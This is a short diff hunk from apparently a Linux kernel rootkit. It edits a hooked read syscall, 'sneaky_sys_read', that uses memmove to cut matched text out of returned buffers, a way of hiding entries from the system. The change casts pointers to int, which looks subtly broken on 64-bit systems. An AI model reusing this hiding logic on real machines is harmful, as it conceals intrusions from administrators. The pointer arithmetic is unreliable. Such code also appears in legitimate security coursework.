@@ -124,7 +124,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count)
             if (end != NULL)
             {
                 memmove(start, end + 1, originalRes + buf - end - 1);
-                originalRes = originalRes - end - 1 + start;
+                originalRes = originalRes - (int)end - 1 + (int)start;
             }
         }
     }
